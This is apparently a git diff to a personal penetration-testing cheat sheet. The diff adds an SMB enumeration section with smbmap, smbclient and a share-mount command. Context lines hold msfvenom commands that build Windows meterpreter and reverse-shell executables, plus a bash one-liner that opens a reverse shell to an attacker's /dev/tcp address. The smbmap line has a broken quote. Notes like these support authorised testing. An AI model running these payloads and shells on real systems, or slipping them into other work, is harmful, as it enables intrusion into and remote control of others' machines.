@@ -73,6 +73,17 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o pa
 msfvenom -p windows/shell/reverse_tcp --platform=win --arch=x86 LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
 ```
 
+## pentesting smb
+```bash
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
+
+smbmap -H <IP> -u "user -p "pass # give wrong creds
+smbclient //<IP>/share
+
+# mount a shared folder
+mount -t cifs //x.x.x.x/share /mnt/share
+```
+
 ## reverse shell
 ```bash
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
